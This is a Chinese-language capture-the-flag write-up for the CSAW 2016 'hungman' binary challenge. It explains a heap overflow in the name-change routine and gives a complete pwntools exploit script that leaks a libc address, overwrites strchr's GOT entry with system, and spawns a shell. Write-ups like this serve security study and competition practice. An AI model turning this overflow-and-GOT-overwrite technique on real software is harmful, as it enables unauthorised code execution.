title: CSAW 2016 hungman writeup

date: 2016/09/19 17:48:00

---

300分的pwn

程序是一个简单的游戏，在你输入名字后，将名字存入malloc出的chunk中，然后会生成一个结构体，大概长这样：

<!--more-->

```
00000000 struc_obj       struc ; (sizeof=0x80)
00000000 score           dd ?
00000004 name_len        dd ?
00000008 namep           dq ?
00000010 content         db 112 dup(?)
00000080 struc_obj       ends
00000080
```

然后开始游戏主循环，在主循环中生成一个和名字大小相同的buf，然后将其与随机数一阵操作生成新的随机buf：

```
    for ( i = 0LL; name_len - 1 > i; ++i )
    {
      *((_BYTE *)buf + i) ^= *(_BYTE *)(objp->namep + i);
      *((_BYTE *)buf + i) = *((_BYTE *)buf + i) % 26u + 97;
    }
```
所以操作结束后buf中将只有小写字母的ascii码，然后打印一排"_"代表buf，接着就是接收输入字符，如果buf中有这个字符，就在下次对应位置打印这个字符而不是"_"，有三次机会可以猜错，机会用完后或者全部猜出来后会获得一次修改名字的机会，这里就是漏洞所在，如果输入的名字比原来的长就可能发生溢出，因为操作长这样：

```
if ( objp->score > score_history )
    {
      puts("High score! change name?");
      __isoc99_scanf(0x40114FLL, &v3);          // %c
      if ( v3 == 121 )
      {
        namep = malloc(0xF8uLL);
        memset(namep, 0, 0xF8uLL);
        new_name_len = read(0, namep, 0xF8uLL);
        objp->name_len = new_name_len;
        v14 = strchr((const char *)namep, 10);
        if ( v14 )
          *v14 = 0;
        memcpy((void *)objp->namep, namep, new_name_len);// ---- overflow  
        free(namep);
      }
      snprintf(byte_602100, 0x200uLL, "Highest player: %s", objp->namep);
      score_history = objp->score;
    }
```

所以如果我们一开始较长的name，那么buf中所有字母基本就都会出现，依次把所有字母输一圈就可以赢得游戏获得改名字的机会，就可以更改较长的名字首先泄漏strchr地址，然后再赢得一次游戏将strchr@got替换位system，然后再赢得一次将name换为/bin/sh触发system就可以了。

但是这里有几个坑，在这里记录一下：
一是一开始选择泄漏函数的时候选了free，但是发现free地址低位是\x00正好截断，所以就换了strchr（不过偏移一位再泄漏free也可以）。
二是选择了strchr后，但是对应的strchr@got上填的地址是strchr_see2，应该是某种优化，所以这里又耽搁了一下。
三是在最后发送system地址过去的时候不能使用sendline，只能使用send，因为sendline导致9个字符被memcpy过去，导致strchr@got下面的printf@got被破坏，崩溃了没得玩了。
四是不知为何在第一次发送name的时候前面必须加个time.sleep(0.1)，或者在play()中加个print recv，否则就可能成功可能失败，这里到现在我也不知道是因为什么，调试的话一点问题也没有，所以到现在还是憋着找不出原因。

参考exploit：

```python
from pwn import *

letters='abcdefghijklmnopqrstuvwxyzz'
name='A'*32
p=process('./hungman')
free_got=0x602018
strchr_got=0x602038
#context.log_level='debug'

def getpid(name):
	pid= pwnlib.util.proc.pidof(name)
	log.info(pid)
	raw_input('continue')

def play():
	print '-- play --'
	for c in letters:
		recv=p.recvline()
		print recv
		if recv.startswith('High score! change name?'):
			# I do not know why it need to print recv here,
			# or it will failed to recieve in line 42
			# time.sleep(0.1) can works here too. why ???
			print recv
			print '[*] win!'
			p.sendline('y')
			return
		if recv.startswith('Default Highscore  score: 64'):
			print '[-] try again...'
			p.recvuntil('Continue? ')
			p.sendline('y')
			return play()
		p.sendline(c)	

p.recvline()
p.sendline('A'*30)
p.recvline()
play()
p.sendline(name+p64(0x0)+p64(0x91)+p32(0x52)+p32(0xc9)+p64(strchr_got))
#context.update(terminal=['tmux','splitw','-h'])
#gdb.attach(p,'b *0x0000000000400E77')

p.recvuntil('Highest player: ')
strchr_addr=p.recvuntil(' score:')[:-7]
strchr_addr=u64(strchr_addr.ljust(8, '\0'))

# actually it is address of strchr_see2, not strchr
print 'strchr addr: '+hex(strchr_addr)
system_addr=strchr_addr-0x30-0x000000000007ff70+0x0000000000041490
print 'system addr: '+hex(system_addr)

p.recvuntil('Continue? ')
p.sendline('y')
play()
# getpid('hungman')
# can not use sendline() here cause it will crash printf@got.plt
p.send(p64(system_addr))
p.recvuntil('Continue? ')
p.sendline('y')
play()
p.sendline('/bin/sh')
p.interactive()
```





